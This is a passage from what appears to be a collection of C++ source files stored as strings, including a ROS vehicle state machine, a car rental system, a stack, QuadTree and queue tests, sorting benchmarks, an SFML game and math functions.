ONLINE:\n        if(!f_online)\n        {\n            ros_interface.ROSLog(LogLevel::kError,\" %s: Vehicle offline,please check cable connection\",DEV_NODE_NAME);\n            online_state = OFFINE;\n        }\n        break;\n    }\n    if(online_state == ONLINE)\n    {\n\n    }\n}\n/*------------------------------------------------------------------------------------------------------------------\n * name: EnableCheck\n -----------------------------------------------------------------------------------------------------------------*/\n#define ENABLE_INIT 0\n#define ENABLE_INIT_FINISH 1\n#define ENABLE 2\n#define DISABLE 3\n#define SLEEP 30\nvoid VehicleFunc::EnableCheck()\n{\n    static int sleep_count = SLEEP;\n    if(!f_online)return;\n    if(sleep_count < SLEEP)\n    {\n        sleep_count++;\n        return;\n    }\n    ROSInterface& ros_interface = ROSInterface::GetInterface();\n    static char enable_state = ENABLE_INIT;\n    switch(enable_state)\n    {\n    case ENABLE_INIT:\n        DevSetEnable(1);\n        sleep_count = 0;\n        enable_state = ENABLE_INIT_FINISH;\n        break;\n    case ENABLE_INIT_FINISH:\n        if(m_dev_info.s_en_state)\n        {\n            ros_interface.ROSLog(LogLevel::kInfo,\"\\033[1;32m %s: Vehicle enable \\033[0m\",DEV_NODE_NAME);\n            enable_state = ENABLE;\n            f_enable = true;\n        }\n        else\n        {\n            ros_interface.ROSLog(LogLevel::kWarn,\" %s: Vehicle disable\",DEV_NODE_NAME);\n            enable_state = DISABLE;\n            f_enable = false;\n        }\n        break;\n    case ENABLE:\n        if(!m_dev_info.s_en_state)\n        {\n        ",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <ctime>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nclass Car {\r\nprivate:\r\n    string licensePlate;\r\n    string model;\r\n    string brand;\r\n    bool isAvailable;\r\n    double dailyRate;\r\n\r\npublic:\r\n    Car(string lp, string m, string b, double rate)\r\n        : licensePlate(lp), model(m), brand(b), isAvailable(true), dailyRate(rate) {}\r\n\r\n    void displayInfo() const {\r\n        cout << \"License Plate: \" << licensePlate << \", Model: \" << model \r\n             << \", Brand: \" << brand << \", Available: \" << (isAvailable ? \"Yes\" : \"No\") \r\n             << \", Daily Rate: $\" << dailyRate << endl;\r\n    }\r\n\r\n    void setAvailability(bool status) {\r\n        isAvailable = status;\r\n    }\r\n\r\n    bool getAvailability() const {\r\n        return isAvailable;\r\n    }\r\n\r\n    double getDailyRate() const {\r\n        return dailyRate;\r\n    }\r\n\r\n    string getLicensePlate() const {\r\n        return licensePlate;\r\n    }\r\n};\r\n\r\nclass Customer {\r\nprivate:\r\n    string name;\r\n    int customerId;\r\n    string licenseNumber;\r\n\r\npublic:\r\n    Customer(string n, int id, string ln)\r\n        : name(n), customerId(id), licenseNumber(ln) {}\r\n\r\n    void displayInfo() const {\r\n        cout << \"Customer Name: \" << name << \", ID: \" << customerId \r\n             << \", License Number: \" << licenseNumber << endl;\r\n    }\r\n\r\n    int getId() const {\r\n        return customerId;\r\n    }\r\n};\r\n\r\nclass Rental {\r\nprivate:\r\n    Car* car;\r\n    Customer* customer;\r\n    time_t rentalDate;\r\n    time_t returnDate;\r\n    double totalCost;\r\n\r\npublic:\r\n    Rental(Car* c, Customer* cust, time_t rental)\r\n        : car(c), customer(cust), rentalDate(rental), totalCost(0) {}\r\n\r\n    void calculateCost(int rentalDays) {\r\n        totalCost = rentalDays * car->getDailyRate();\r\n    }\r\n\r\n    void setReturnDate(time_t returnDate) {\r\n        this->returnDate = returnDate;\r\n    }\r\n\r\n    void displayRentalInfo() const {\r\n        cout << \"Rental Info: \" << endl;\r\n        cout << \"Car: \" << car->getLicensePlate() << \", Customer ID: \" \r\n             << customer->getId() << \", Total Cost: $\" << totalCost << endl;\r\n    }\r\n};\r\n\r\nclass CarRentalSystem {\r\nprivate:\r\n    vector<Car> cars;\r\n    vector<Customer> customers;\r\n    vector<Rental> rentals;\r\n\r\npublic:\r\n    void addCar(const Car& car) {\r\n        cars.push_back(car);\r\n    }\r\n\r\n    void registerCustomer(const Customer& customer) {\r\n        customers.push_back(customer);\r\n    }\r\n\r\n    void rentCar(string licensePlate, int customerId, int rentalDays) {\r\n        for (auto& car : cars) {\r\n            if (car.getLicensePlate() == licensePlate && car.getAvailability()) {\r\n                car.setAvailability(false);\r\n                time_t rentalDate = time(0);\r\n                Rental rental(&car, nullptr, rentalDate);\r\n\r\n                for (auto& customer : customers) {\r\n                    if (customer.getId() == customerId) {\r\n                        rental = Rental(&car, &customer, rentalDate);\r\n                        rental.calculateCost(rentalDays);\r\n                        rentals.push_back(rental);\r\n                        cout << \"Car rented successfully.\" << endl;\r\n                        return;\r\n                    }\r\n                }\r\n                cout << \"Customer not found.\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Car not available.\" << endl;\r\n    }\r\n\r\n    void returnCar(string licensePlate) {\r\n        for (auto& car : cars) {\r\n            if (car.getLicensePlate() == licensePlate) {\r\n                car.setAvailability(true);\r\n                cout << \"Car returned successfully.\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Car not found.\" << endl;\r\n    }\r\n\r\n    void generateReport() const {\r\n        cout << \"Cars in Rental System: \" << endl;\r\n        for (const auto& car : cars) {\r\n            car.displayInfo();\r\n        }\r\n        cout << \"Customers in Rental System: \" << endl;\r\n        for (const auto& customer : customers) {\r\n            customer.displayInfo();\r\n        }\r\n        cout << \"Rentals: \" << endl;\r\n        for (const auto& rental : rentals) {\r\n            rental.displayRentalInfo();\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    CarRentalSystem rentalSystem;\r\n\r\n    rentalSystem.addCar(Car(\"ABC123\", \"Model S\", \"Tesla\", 100.0));\r\n    rentalSystem.addCar(Car(\"XYZ456\", \"Mustang\", \"Ford\", 80.0));\r\n\r\n    rentalSystem.registerCustomer(Customer(\"Alice\", 1, \"L12345\"));\r\n    rentalSystem.registerCustomer(Customer(\"Bob\", 2, \"L67890\"));\r\n\r\n    rentalSystem.rentCar(\"ABC123\", 1, 5);\r\n    rentalSystem.returnCar(\"ABC123\");\r\n\r\n    rentalSystem.generateReport();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n#define MAX 100\r\n\r\nclass Stack {\r\nprivate:\r\n    int arr[MAX];\r\n    int top;\r\n\r\npublic:\r\n    Stack() { top = -1; }\r\n\r\n    bool isFull() {\r\n        return top == MAX - 1;\r\n    }\r\n\r\n    bool isEmpty() {\r\n        return top == -1;\r\n    }\r\n\r\n    void push(int value) {\r\n        if (isFull()) {\r\n            cout << \"Stack overflow! Cannot push \" << value << endl;\r\n            return;\r\n        }\r\n        arr[++top] = value;\r\n        cout << value << \" pushed to stack.\" << endl;\r\n    }\r\n\r\n    void pop() {\r\n        if (isEmpty()) {\r\n            cout << \"Stack underflow! Cannot pop.\" << endl;\r\n            return;\r\n        }\r\n        cout << arr[top--] << \" popped from stack.\" << endl;\r\n    }\r\n\r\n    void display() {\r\n        if (isEmpty()) {\r\n            cout << \"Stack is empty.\" << endl;\r\n            return;\r\n        }\r\n        cout << \"Stack elements: \";\r\n        for (int i = top; i >= 0; i--) {\r\n            cout << arr[i] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\nint main() {\r\n    Stack stack;\r\n    int choice, value;\r\n\r\n    do {\r\n        cout << \"\\nMenu:\\n\";\r\n        cout << \"1. Push\\n\";\r\n        cout << \"2. Pop\\n\";\r\n        cout << \"3. Display\\n\";\r\n        cout << \"4. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                cout << \"Enter value to push: \";\r\n                cin >> value;\r\n                stack.push(value);\r\n                break;\r\n            case 2:\r\n                stack.pop();\r\n                break;\r\n            case 3:\r\n                stack.display();\r\n                break;\r\n            case 4:\r\n                cout << \"Exited out\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice! Please try again.\" << endl;\r\n        }\r\n    } while (choice != 4);\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n/* Output\r\nMenu:\r\n1. Push\r\n2. Pop\r\n3. Display\r\n4. Exit\r\nEnter your choice: 1\r\nEnter value to push: 4\r\n4 pushed to stack.\r\n\r\n*/",
    "#include <gtest/gtest.h>\n#include \"QuadTree.hpp\"\n\nclass QuadTreeTest : public ::testing::Test {\nprotected:\n    void SetUp() override {\n        // Create a QuadTree covering a 100x100 area centered at (0,0)\n        tree = std::make_unique<QuadTree>(Rect(0.0f, 0.0f, 50.0f, 50.0f));\n    }\n\n    std::unique_ptr<QuadTree> tree;\n};\n\n// Test inserting a point into the QuadTree\nTEST_F(QuadTreeTest, InsertPoint) {\n    EXPECT_TRUE(tree->insert(Point(10.0f, 10.0f)));   // Point inside\n    EXPECT_TRUE(tree->insert(Point(-10.0f, -10.0f))); // Point inside\n    EXPECT_TRUE(tree->insert(Point(0.0f, 0.0f)));     // Point at the center\n}\n\n// Test inserting a point outside the QuadTree bounds\nTEST_F(QuadTreeTest, InsertOutOfBounds) {\n    EXPECT_FALSE(tree->insert(Point(60.0f, 60.0f)));  // Point outside\n    EXPECT_FALSE(tree->insert(Point(-60.0f, -60.0f))); // Point outside\n}\n\n// Test QuadTree subdivision\nTEST_F(QuadTreeTest, Subdivision) {\n    for (int i = 0; i < QuadTree::capacity(); ++i) {\n        EXPECT_TRUE(tree->insert(Point(static_cast<float>(i), static_cast<float>(i))));\n    }\n    EXPECT_FALSE(tree->isDivided());  // Should not be divided yet.\n\n    EXPECT_TRUE(tree->insert(Point(QuadTree::capacity(), QuadTree::capacity())));\n    EXPECT_TRUE(tree->isDivided());  // Tree should now be subdivided.\n}\n\n// Test Rect contains method\nTEST_F(QuadTreeTest, RectContains) {\n    const Rect rect(0.0f, 0.0f, 10.0f, 10.0f);\n    EXPECT_TRUE(rect.contains(Point(0.0f, 0.0f)));    // Point at center\n    EXPECT_TRUE(rect.contains(Point(10.0f, 10.0f)));  // Point at edge\n    EXPECT_TRUE(rect.contains(Point(-10.0f, -10.0f))); // Point at negative edge\n    EXPECT_FALSE(rect.contains(Point(11.0f, 11.0f)));  // Point outside\n}\n\n// Test Rect intersects method\nTEST_F(QuadTreeTest, RectIntersects) {\n    const Rect rect1(0.0f, 0.0f, 10.0f, 10.0f);\n    const Rect rect2(5.0f, 5.0f, 10.0f, 10.0f);  // Overlaps with rect1\n    const Rect rect3(20.0f, 20.0f, 5.0f, 5.0f);  // Does not overlap with rect1\n\n    EXPECT_TRUE(rect1.intersects(rect2));  // Should intersect\n    EXPECT_FALSE(rect1.intersects(rect3)); // Should not intersect\n}\n\n// Test Point equality operator\nTEST_F(QuadTreeTest, PointEquality) {\n    const Point p1(1.0f, 2.0f);\n    const Point p2(1.0f, 2.0f);\n    const Point p3(2.0f, 1.0f);\n\n    EXPECT_EQ(p1, p2);  // p1 and p2 should be equal\n    EXPECT_NE(p1, p3);  // p1 and p3 should not be equal\n}\n\n// Test Point comparison operator\nTEST_F(QuadTreeTest, PointComparison) {\n    const Point p1(1.0f, 2.0f);\n    const Point p2(2.0f, 1.0f);\n    const Point p3(1.0f, 3.0f);\n\n    EXPECT_LT(p1, p2);  // p1 is less than p2\n    EXPECT_LT(p1, p3);  // p1 is less than p3\n}\n\n// Test KNN search with a small set of points\nTEST_F(QuadTreeTest, NearestNeighborsSmallSet) {\n    tree->insert(Point(10.0f, 10.0f));\n    tree->insert(Point(-10.0f, -10.0f));\n    tree->insert(Point(20.0f, 20.0f));\n    tree->insert(Point(30.0f, 30.0f));\n    tree->insert(Point(40.0f, 40.0f));\n\n    tree->print_quadtree();  // Print the QuadTree structure\n    std::array<Point, 3> nearest;\n    float maxDist = std::numeric_limits<float>::max();\n    std::priority_queue<QueueItem, std::vector<QueueItem>, std::greater<>> nodeQueue;\n    std::vector<std::pair<float, Point>> nearestHeap;\n    tree->nearestNeighbors<3>(Point(0.0f, 0.0f), nearest, maxDist, nodeQueue, nearestHeap);\n\n    std::vector<Point> expected = {Point(10.0f, 10.0f), Point(-10.0f, -10.0f), Point(20.0f, 20.0f)};\n    for (const auto& point : nearest) {\n        EXPECT_TRUE(std::find(expected.begin(), expected.end(), point) != expected.end());\n    }\n}\n\n// Test KNN search with a large set of points\nTEST_F(QuadTreeTest, NearestNeighborsLargeSet) {\n    for (int i = -40; i <= 40; i += 10) {\n        for (int j = -40; j <= 40; j += 10) {\n            tree->insert(Point(static_cast<float>(i), static_cast<float>(j)));\n        }\n    }\n\n    std::array<Point, 5> nearest;\n    float maxDist = std::numeric_limits<float>::max();\n    std::priority_queue<QueueItem, std::vector<QueueItem>, std::greater<>> nodeQueue;\n    std::vector<std::pair<float, Point>> nearestHeap;\n    tree->nearestNeighbors<5>(Point(15.0f, 15.0f), nearest, maxDist, nodeQueue, nearestHeap);\n\n    std::vector<Point> expected = {Point(10.0f, 10.0f), Point(20.0f, 10.0f), Point(10.0f, 20.0f), Point(20.0f, 20.0f), Point(0, 10.0f)};\n    for (const auto& point : nearest) {\n        EXPECT_TRUE(std::find(expected.begin(), expected.end(), point) != expected.end());\n    }\n}\n\n// Test KNN search when the target is on an existing point\nTEST_F(QuadTreeTest, NearestNeighborsTargetOnExistingPoint) {\n    tree->insert(Point(0.0f, 0.0f));\n    tree->insert(Point(10.0f, 10.0f));\n    tree->insert(Point(-10.0f, -10.0f));\n    tree->insert(Point(20.0f, 20.0f));\n\n    std::array<Point, 3> nearest;\n    float maxDist = std::numeric_limits<float>::max();\n    std::priority_queue<QueueItem, std::vector<QueueItem>, std::greater<>> nodeQueue;\n    std::vector<std::pair<float, Point>> nearestHeap;\n    tree->nearestNeighbors",
    "#include \"C:\\Users\\12203\\Downloads\\CSCI240\\common\\test.h\"\r\n#include \"simple_container.h\"\r\n#include \"array_queue.h\"\r\n\r\n#define SETUP SimpleContainer<int>* q{new ArrayQueue<int>}\r\n#define TEARDOWN delete q\r\n#define TEST_VAL 5\r\n\r\nvoid testEmptyQueue();\r\nvoid testAddItem();\r\nvoid testPeekItem();\r\nvoid testRemove();\r\nvoid testRemoveOrder();\r\nvoid testExceptionOnEmptyPeek();\r\nvoid testExceptionOnEmptyRemove();\r\n\r\n\r\nint main(int argc, char const *argv[]){\r\n    testEmptyQueue();\r\n    testAddItem();\r\n    testPeekItem();\r\n    testRemove();\r\n    testRemoveOrder();\r\n    testExceptionOnEmptyPeek();\r\n    testExceptionOnEmptyRemove();\r\n    return 0;\r\n}\r\n\r\n\r\nvoid testEmptyQueue(){\r\n    SETUP;\r\n    testTrue(q->empty(), \"test queue is initially empty\");\r\n    TEARDOWN;\r\n}\r\n\r\nvoid testAddItem(){\r\n    SETUP;\r\n    q->add(TEST_VAL);\r\n    testTrue(!q->empty(), \"test not empty after an added item\");\r\n    TEARDOWN;\r\n}\r\n\r\nvoid testPeekItem(){\r\n    SETUP;\r\n    q->add(TEST_VAL);\r\n    testTrue(q->peek()==5, \"test peek returns an added item\");\r\n    TEARDOWN;\r\n}\r\n\r\nvoid testRemove()\r\n{\r\n    SETUP;\r\n    q->add(TEST_VAL);\r\n    q->remove();\r\n    testTrue(q->empty(), \"test empty on a final remove\");\r\n    TEARDOWN;\r\n}\r\n\r\nvoid testRemoveOrder(){\r\n    SETUP;  \r\n    size_t i;\r\n    for (i = 0; i < TEST_VAL; ++i){\r\n        q->add(i);\r\n    }\r\n\r\n    for (i = 0; i < TEST_VAL; ++i){\r\n        if(q->peek()!=i){\r\n            testFail(\"test ordering\");\r\n            break; \r\n        }\r\n        q->remove();\r\n    }\r\n\r\n    if(i==TEST_VAL) testPass(\"test ordering\");\r\n\r\n    TEARDOWN;\r\n}\r\n\r\nvoid testExceptionOnEmptyPeek(){\r\n    SETUP;\r\n    try\r\n    {\r\n        q->peek();\r\n        testFail(\"test throw logic error on empty peek\");\r\n    }\r\n    catch(const std::logic_error& e)\r\n    {\r\n        testPass(\"test throw logic error on empty peek\");\r\n    }\r\n    \r\n    TEARDOWN; \r\n}\r\n\r\nvoid testExceptionOnEmptyRemove(){\r\n    SETUP;\r\n    try\r\n    {\r\n        q->remove();\r\n        testFail(\"test throw logic error on empty remove\");\r\n    }\r\n    catch(const std::logic_error& e)\r\n    {\r\n        testPass(\"test throw logic error on empty remove\");\r\n    }\r\n    TEARDOWN; \r\n}",
    "#include <iostream>\n#include <cstdlib> // Para usar rand()\n#include <ctime>   // Para usar time()\n#include <string>\n#include <chrono>  // Para medir o tempo de execu\u00e7\u00e3o\n#include <algorithm> // Para copy\n\nusing namespace std;\n\nstruct RegistroVenda {\n    string nomeProduto;\n    int quantidadeVendida;\n    double precoUnitario;\n    string dataVenda;\n};\n\nvoid gerarRegistros(RegistroVenda registros[], int tamanho) {\n    srand((unsigned)time(0));\n    for (int i = 0; i < tamanho; ++i) {\n        registros[i].nomeProduto = \"Produto_\" + to_string(i + 1);\n        registros[i].quantidadeVendida = rand() % 100 + 1;\n        registros[i].precoUnitario = (rand() % 10000) / 100.0;\n        registros[i].dataVenda = \"15/10/2024\";\n    }\n}\n\n// Bubble Sort\nvoid bubbleSort(RegistroVenda arr[], int n) {\n    for (int i = 0; i < n - 1; ++i) {\n        for (int j = 0; j < n - i - 1; ++j) {\n            if (arr[j].precoUnitario < arr[j + 1].precoUnitario) {\n                swap(arr[j], arr[j + 1]);\n            }\n        }\n    }\n}\n\n// Insertion Sort\nvoid insertionSort(RegistroVenda arr[], int n) {\n    for (int i = 1; i < n; ++i) {\n        RegistroVenda key = arr[i];\n        int j = i - 1;\n        while (j >= 0 && arr[j].precoUnitario < key.precoUnitario) {\n            arr[j + 1] = arr[j];\n            --j;\n        }\n        arr[j + 1] = key;\n    }\n}\n\n// Selection Sort\nvoid selectionSort(RegistroVenda arr[], int n) {\n    for (int i = 0; i < n - 1; ++i) {\n        int max_idx = i;\n        for (int j = i + 1; j < n; ++j) {\n            if (arr[j].precoUnitario > arr[max_idx].precoUnitario) {\n                max_idx = j;\n            }\n        }\n        swap(arr[max_idx], arr[i]);\n    }\n}\n\n// Counting Sort\nvoid countingSort(RegistroVenda arr[], int n, int range) {\n    int* count = new int[range + 1]();\n    RegistroVenda* output = new RegistroVenda[n];\n\n    for (int i = 0; i < n; ++i) {\n        int precoInteiro = static_cast<int>(arr[i].precoUnitario * 100);\n        ++count[precoInteiro];\n    }\n\n    for (int i = 1; i <= range; ++i) {\n        count[i] += count[i - 1];\n    }\n\n    for (int i = n - 1; i >= 0; --i) {\n        int precoInteiro = static_cast<int>(arr[i].precoUnitario * 100);\n        output[count[precoInteiro] - 1] = arr[i];\n        --count[precoInteiro];\n    }\n\n    for (int i = 0; i < n; ++i) {\n        arr[i] = output[i];\n    }\n\n    delete[] count;\n    delete[] output;\n}\n\n// Shell Sort\nvoid shellSort(RegistroVenda arr[], int n) {\n    for (int gap = n / 2; gap > 0; gap /= 2) {\n        for (int i = gap; i < n; ++i) {\n            RegistroVenda temp = arr[i];\n            int j;\n            for (j = i; j >= gap && arr[j - gap].precoUnitario < temp.precoUnitario; j -= gap) {\n                arr[j] = arr[j - gap];\n            }\n            arr[j] = temp;\n        }\n    }\n}\n\n// QuickSort\nint partition(RegistroVenda arr[], int low, int high) {\n    double pivot = arr[high].precoUnitario;\n    int i = (low - 1);\n    for (int j = low; j < high; ++j) {\n        if (arr[j].precoUnitario >= pivot) {\n            ++i;\n            swap(arr[i], arr[j]);\n        }\n    }\n    swap(arr[i + 1], arr[high]);\n    return (i + 1);\n}\n\nvoid quickSort(RegistroVenda arr[], int low, int high) {\n    if (low < high) {\n        int pi = partition(arr, low, high);\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n}\n\n// Fun\u00e7\u00e3o para medir o tempo de execu\u00e7\u00e3o\ntemplate <typename Func>\nvoid medirTempoExecucao(Func func, RegistroVenda arr[], int n, const string &algoritmo) {\n    double totalDuracao = 0;\n\n    // ALTERAR REPETICOES PARA QUE VOCE POSSA TESTAR COM MAIORES REPETICOES PARA OBTER MEDIA\n    int repeticoes = 1;\n\n    for (int i = 0; i < repeticoes; ++i) {\n        auto inicio = chrono::high_resolution_clock::now();\n\n        func(arr, n);\n\n        auto fim = chrono::high_resolution_clock::now();\n        chrono::duration<double> duracao = fim - inicio;\n        totalDuracao += duracao.count();\n    }\n    cout << \"Tempo medio de execucao para \" << algoritmo << \": \" << (totalDuracao / repeticoes) << \" segundos\\n\";\n}\n\nint main() {\n    // ALTERAR TAMANHO PARA QUE VOCE POSSA TESTAR COM n NUMEROS DE PRODUTOS\n    int tamanho = 100000;\n\n    RegistroVenda* registros = new RegistroVenda[tamanho];\n\n    // Bolha\n    gerarRegistros(registros, tamanho);\n    medirTempoExecucao(bubbleSort, registros, tamanho, \"Bolha\");\n\n    // Inser\u00e7\u00e3o\n    gerarRegistros(registros, tamanho);\n    medirTempoExecucao(insertionSort, registros, tamanho, \"Insercao\");\n\n    // Sele\u00e7\u00e3o\n    gerarRegistros(registros, tamanho);\n    medirTempoExecucao(selectionSort, registros, tamanho, \"Selecao\");\n\n    // Shell\n    gerarRegistros(registros, tamanho);\n    medirTempoExecucao(shellSort, registros, tamanho, \"Shell\");\n\n    // Contagem\n    gerarRegistros(registros, tamanho);\n    medirTempoExecucao([&](RegistroVenda arr[], int n) { countingSort(arr, n, 10000); }, registros, tamanho, \"Contagem\");\n\n    // QuickSort\n    gerarRegistros(registros, tamanho);\n    medirTempoExecucao([&](RegistroVenda arr[], int n)",
    "#include \"Board.hpp\"\n#include <SFML/Graphics.hpp>\n\n#define BOARD_DIMENSION (5)\n#define OFFSET_PERCENT (20)\n\nvoid handleEvent (sf::Event* event, sf::Window* window);\nsf::Vector2u calculateBoardSize (sf::Vector2u windowSize, unsigned offsetPercent);\n\n\nint main(int argc, char** argv)\n{\n    // Load font and check for error\n    sf::Font font;\n    if(!font.loadFromFile(\"../resources/HackNerdFont-Regular.ttf\"))  exit(1);\n\n    sf::RenderWindow mainWindow(sf::VideoMode::getDesktopMode(), \"SumS\", sf::Style::Fullscreen);\n\n    sf::Vector2u mainWindowSize = mainWindow.getSize();\n    sf::Vector2u boardSize = calculateBoardSize(mainWindowSize, OFFSET_PERCENT);\n    sf::Vector2u drawOffset = sf::Vector2u((mainWindowSize.x - boardSize.x) / 2, (mainWindowSize.y - boardSize.y) / 2);\n\n    Board gameBoard = Board(boardSize.x, BOARD_DIMENSION, &font);\n\n    while (mainWindow.isOpen())\n    {\n        sf::Event event;\n        while (mainWindow.pollEvent(event))\n        {\n            handleEvent(&event, &mainWindow);\n        }\n\n        mainWindow.clear(sf::Color(50, 50, 50));\n\n        gameBoard.draw(&mainWindow, sf::Vector2f(drawOffset));\n\n        mainWindow.display();\n    }\n\n    return 0;\n}\n\nvoid handleEvent(sf::Event* event, sf::Window* window)\n{\n    if (event->type == sf::Event::Closed || (event->type == sf::Event::KeyPressed && event->key.code == sf::Keyboard::Q))\n        window->close();\n}\n\nsf::Vector2u calculateBoardSize (sf::Vector2u windowSize, unsigned offsetPercent)\n{\n    sf::Vector2u retVector;\n\n    if(windowSize.x < windowSize.y)\n    {\n        retVector.x = windowSize.x * (100 - 2 * offsetPercent) / 100;\n        retVector.y = retVector.x;\n    }\n\n    else {\n        retVector.y = windowSize.y * (100 - 2 * offsetPercent) / 100;\n        retVector.x = retVector.y;\n    }\n\n    return retVector;\n}\n",
    "#include<iostream>\r\n#include<cmath>\r\n#include<math.h>\r\n#include<fstream>\r\n\r\nusing namespace std;\r\n\r\n\r\ndouble on2(double x) {\r\n\t// \u0444\u0443\u043d\u043a\u0446 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0447\u0438\u0441\u043b\u043e, \u0443\u043c\u043d\u043e\u0436\u0435\u043d\u043d\u043e\u0435 \u043d\u0430 2:  x * 2\r\n\treturn x * 2;\r\n}\r\n\r\n\r\ndouble in2(double x) {\r\n\t// \u0444\u0443\u043d\u043a\u0446 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0447\u0438\u0441\u043b\u043e, \u0432\u043e\u0437\u0432\u0435\u0434\u0435\u043d\u043d\u043e\u0435 \u0432 \u0441\u0442\u0435\u043f\u0435\u043d\u044c 2:  x * \u0445 (\u043f\u043e \u0441\u0443\u0442\u0438, \u044f \u043f\u0440\u043e\u0441\u0442\u043e \u0443\u043c\u043d\u043e\u0436\u0438\u043b \u0447\u0438\u0441\u043e \u043d\u0430 \u044d\u0442\u043e \u0436\u0435 \u0447\u0438\u0441\u043b\u043e).\r\n\treturn x * x;\r\n}\r\n\r\ndouble module(double x) {\r\n\t// \u0444\u0443\u043d\u043a\u0446 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0447\u0438\u0441\u043b\u043e, \u0443\u043c\u043d\u043e\u0436\u0435\u043d\u043d\u043e\u0435 \u043d\u0430 -1, \u0432 \u0441\u043b\u0443\u0447\u0430\u0435, \u0435\u0441\u043b\u0438 \u043e\u043d\u043e \u043e\u043a\u0430\u0436\u0435\u0442\u0441\u044f \u043c\u0435\u043d\u044c\u0448\u0435, \u0447\u0435\u043c 0.\r\n\tif (x < 0) {\r\n\t\tx = x * (-1);\r\n\t\treturn x;\r\n\t}\r\n\r\n\telse {\r\n\t\treturn x;\r\n\t}\r\n}\r\n\r\ndouble sin2(double x, const double PI) {\r\n\t// \u0441\u043d\u0430\u0447\u0430\u043b\u0430 \u044f \u043f\u0435\u0440\u0435\u0432\u0435\u043b \u0432 \u0440\u0430\u0434\u0438\u0430\u043d\u044b. \u0434\u043b\u044f \u044d\u0442\u043e\u0433\u043e \u043d\u0443\u0436\u043d\u043e \u0431\u044b\u043b\u043e \u0447\u0438\u0441\u043b\u043e \u041f\u0418. \u0432 \u043a\u0430\u0436\u0434\u0443\u044e \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0435\u0433\u043e \u0432\u0441\u0442\u0430\u0432\u043b\u044f\u0442\u044c \u043d\u0435\u0432\u044b\u0433\u043e\u0434\u043d\u043e\r\n\t// \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u044f \u0441\u0434\u0435\u043b\u0430\u043b \u0442\u0430\u043a, \u0447\u0442\u043e\u0431\u044b \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u043b\u0430 \u041f\u0418, \u043a\u0430\u043a \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442. \u044d\u0442\u043e \u043d\u0435 \u0437\u0430\u0442\u0440\u0443\u0434\u043d\u0438\u0442 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b,\r\n\t// \u043f\u043e\u0442\u043e\u043c\u0443 \u0447\u0442\u043e \u043d\u0430\u043f\u0440\u044f\u043c\u0443\u044e \u0441 \u0444\u0443\u043d\u043a\u0446\u0438\u0435\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0435 \u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0443\u0435\u0442\r\n\tdouble radians = x * PI / 180;\r\n\r\n\treturn sin(radians);\r\n}\r\n\r\ndouble minus_seven_and_half_squared(double x) {\r\n\t// \u0444\u0443\u043d\u043a\u0446 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0447\u0438\u0441\u043b\u043e, \u0443\u043c\u043d\u043e\u0436\u0435\u043d\u043d\u043e\u0435 \u043d\u0430 \u044d\u0442\u043e \u0436\u0435 \u0447\u0438\u0441\u043b\u043e \u0438 \u043d\u0430 -7.5\r\n\treturn (x * x) * -7.5;\r\n}\r\n\r\ndouble three_sqrt(double x) {\r\n\t;\t// \u0444\u0443\u043d\u043a\u0446 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u043a\u043e\u0440\u0435\u043d\u044c \u0447\u0438\u0441\u043b\u0430, \u0443\u043c\u043d\u043e\u0436\u0435\u043d\u043d\u044b\u0439 \u043d\u0430 3.\r\n\treturn sqrt(x) * 3;\r\n}\r\n\r\n\r\ndouble sinl_plus_b(double x, double y, const double PI) {\r\n\t// \u0444\u0443\u043d\u043a\u0446 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 2 \u0447\u0438\u0441\u043b\u0430 \u0438 \u0447\u0438\u0441\u043b\u043e \u041f\u0418 (\u0420\u0430\u043d\u043d\u0435\u0435 \u0443\u0436\u0435 \u043e\u0431\u044a\u044f\u0441\u043d\u044f\u043b, \u043f\u043e\u0447\u0435\u043c\u0443)\r\n\t// \u0432\u044b\u0432\u043e\u0434 \u0431\u0443\u0434\u0435\u0442 \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0432\u043e\u0432\u0430\u0442\u044c \u0444\u043e\u0440\u043c\u0443\u043b\u0435 sinacosb + sinbcosa, \u0447\u0442\u043e \u0440\u0430\u0432\u043d\u043e sin(a+b).(\u0442\u0440\u0438\u0433\u043e\u043d\u043e\u043c\u0435\u0442\u0440\u0438\u044f \u0440\u0443\u043b\u0438\u0442)\r\n\tdouble radians_x = x * PI / 180;\r\n\tdouble radians_y = y * PI / 180;\r\n\r\n\treturn sin(radians_x) * cos(radians_y) + sin(radians_y) * cos(radians_x);\r\n}\r\n\r\ndouble cos_five(double x, double PI) {\r\n\t//\u044d\u0442\u043e 5 * cos(x)\r\n\tdouble radians_x = x * PI / 180;\r\n\r\n\treturn cos(radians_x) * 5;\r\n}\r\n\r\ndouble sqrt_and_two(double x, double y) {//a * sqrt(2*b)\r\n\tdouble under_root = x * 